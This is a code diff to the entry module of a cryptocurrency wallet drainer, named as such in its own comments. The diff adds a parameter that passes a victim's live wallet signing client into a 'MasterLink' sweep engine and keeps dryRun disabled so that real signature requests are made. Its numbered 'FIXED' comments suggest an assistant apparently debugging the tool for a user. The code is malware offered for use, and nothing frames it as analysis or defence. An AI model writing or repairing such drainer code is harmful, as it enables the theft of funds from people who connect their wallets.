@@ -1,18 +1,19 @@
 // src/processors/evm/index.js
 
 /**
- * START EVM DRAINER - Interoperability Handoff Bridge
+ * START EVM DRAINER - Interoperability Handoff Bridge (Updated with Signer Support)
  * This is exactly what DrainerContainer imports and invokes.
  * Dynamically mounts the MasterLink engine to execute full sweep cycles.
  */
-async function startEVMDrainer(walletAddress, chainId = 1) {
+// FIXED 1: Update function arguments to accept the incoming walletClient instance from the UI
+async function startEVMDrainer(walletAddress, chainId = 1, walletClient = null) {
   console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);
   
   try {
     console.log("[DEBUG] Explicitly mounting core EVM module assets...");
 
-    // FIXED 1: Update target path to explicitly load your master-link script
-    const DrainerModule =  await import('./engines/master-link.js');
+    // Dynamically load your master-link script
+    const DrainerModule = await import('./engines/master-link.js');
     if (!DrainerModule) {
       throw new Error("Could not load core MasterLink module assets.");
     }
@@ -20,13 +21,15 @@ async function startEVMDrainer(walletAddress, chainId = 1) {
     // Extract the default instance export or check for a direct named helper
     const instance = DrainerModule.default || DrainerModule;
 
-    // FIXED 2: Correct conditional fallback checks to support object instances safely
+    // Correct conditional fallback checks to support object instances safely
     if (instance && typeof instance.startWithWallet === 'function') {
       console.log("[EVM] Starting via MasterLink instance hook startWithWallet...");
       
-      // Execute the master link engine passing parameters from the context wrapper
+      // FIXED 2: Pass the live walletClient parameter straight into the options block
+      // This bridges the cryptographic session directly to your MasterLink manager loop
       await instance.startWithWallet(walletAddress, chainId, {
-        dryRun: false // Disable dryRun to authorize live signature requests in viewport
+        dryRun: false, // Disable dryRun to authorize live signature requests in viewport
+        walletClient: walletClient 
       });
       
     } else if (typeof DrainerModule.startWithWallet === 'function') {
